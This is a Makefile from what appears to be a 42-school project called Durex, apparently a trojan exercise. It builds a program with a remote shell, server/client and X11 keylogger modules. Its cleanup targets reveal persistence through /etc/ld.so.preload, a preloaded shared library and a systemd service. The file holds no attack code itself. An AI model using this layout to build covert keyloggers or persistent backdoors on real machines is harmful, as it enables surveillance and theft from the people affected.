# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    Makefile                                           :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: gbourgeo <gbourgeo@student.42.fr>          +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2018/01/12 20:15:31 by root              #+#    #+#              #
#    Updated: 2019/07/19 17:19:19 by gbourgeo         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

NAME	= Durex
SRC		= main.c install.c durex.c server.c client.c encrypt.c commands.c
SRC		+= signal.c move.c reporter.c stdlib.c library.c shell.c
SRC_KEY	= keylogger_init.c keylogger_loop.c handlers.c
SRC_KEY	+= get_console.c get_keyboard.c get_keymaps.c get_keys.c get_keystate.c
OBJ		= $(addprefix $(OBJ_DIR), $(SRC:.c=.o))
OBJ		+= $(addprefix $(OBJ_DIR), $(SRC_KEY:.c=.o))
DEP		= $(addprefix $(DEP_DIR), $(SRC:.c=.d))
DEP		+= $(addprefix $(DEP_DIR), $(SRC_KEY:.c=.d))
SRC_DIR	= srcs/
SRC_KEY_DIR = $(SRC_DIR)keylogger/
HDR_DIR = -I includes/
OBJ_DIR	= objs/
DEP_DIR = .deps/
LIBS	= -lX11
FLAGS	= -Wall -Werror -Wextra

all: $(OBJ_DIR) $(NAME)

$(OBJ_DIR):
	mkdir -p $@
	mkdir -p $(DEP_DIR)

$(NAME): $(OBJ)
	$(CC) -o $@ $^ $(LIBS)

$(OBJ_DIR)%.o: $(SRC_DIR)%.c
$(OBJ_DIR)%.o: $(SRC_DIR)%.c $(DEP_DIR)%.d
	$(CC) -MT $@ -MMD -MP -MF $(DEP_DIR)$*.Td $(FLAGS) -o $@ -c $< $(HDR_DIR)
	@mv -f $(DEP_DIR)$*.Td $(DEP_DIR)$*.d && touch $@

$(OBJ_DIR)shell.o: FLAGS += -D_XOPEN_SOURCE=600

$(OBJ_DIR)%.o: $(SRC_KEY_DIR)%.c
$(OBJ_DIR)%.o: $(SRC_KEY_DIR)%.c $(DEP_DIR)%.d
	$(CC) -MT $@ -MMD -MP -MF $(DEP_DIR)$*.Td $(FLAGS) -o $@ -c $< $(HDR_DIR)
	@mv -f $(DEP_DIR)$*.Td $(DEP_DIR)$*.d && touch $@

$(DEP_DIR)%.d: ;
.PRECIOUS: $@

-include $(DEP)

clean:
	/bin/rm -rf $(OBJ_DIR)
	/bin/rm -rf $(DEP_DIR)

fclean: clean
	/bin/rm -f $(NAME)

re: fclean all

rm:
	/bin/rm -f /etc/ld.so.preload
	/bin/rm -f /usr/local/lib/Durex.so
	systemctl stop durex && systemctl disable durex;
	@if test -f /bin/Durex; then \
	rm /bin/Durex && \
	echo rm Durex; \
	fi
	@if test -f /lib/systemd/system/durex.service; then \
	rm -f /lib/systemd/system/durex.service && \
	echo rm Durex service; \
	fi
	@if test -f /var/log/Durex.log; then \
	rm /var/log/Durex.log && \
	echo rm Durex log; \
	fi
	@if test -f /var/lock/Durex.lock; then \
	rm /var/lock/Durex.lock && \
	echo rm Durex lock; \
	fi

files:
	/bin/rm -f /etc/ld.so.preload
	/bin/rm -f /usr/local/lib/Durex.so
	/bin/rm -f /bin/Durex
	/bin/rm -f /lib/systemd/system/durex.service
	/bin/rm -f /var/log/Durex.log
	/bin/rm -f /var/lock/Durex.lock


OTHER_D	= other/

PASS	= pass
PASS_C	= passwd.c encrypt.c
PASS_O	= $(addprefix $(OTHER_D), $(PASS_C:.c=.o))

$(PASS): $(PASS_O)
	$(CC) -o $@ $^
$(OTHER_D)%.o: $(OTHER_D)%.c
	$(CC) -o $@ -c $< $(HDR_DIR)
$(OTHER_D)%.o: $(SRC_DIR)%.c
	$(CC) -o $@ -c $< $(HDR_DIR)
passrm:
	/bin/rm $(PASS_O)
	/bin/rm $(PASS)

HEX		= hex
HEX_C	= txttohex.c
HEX_O	= $(addprefix $(OTHER_D), $(HEX_C:.c=.o))

$(HEX): $(HEX_O)
	$(CC) -o $@ $^
hexrm:
	/bin/rm $(HEX_O)
	/bin/rm $(HEX)

KEY		= key
KEY_C	= keylogger.c
KEY_O	= $(addprefix $(OTHER_D), $(KEY_C:.c=.o))

$(KEY): $(KEY_O) other/keys.h
	$(CC) -o $@ $^
keyrm:
	/bin/rm $(KEY_O)
	/bin/rm $(KEY)
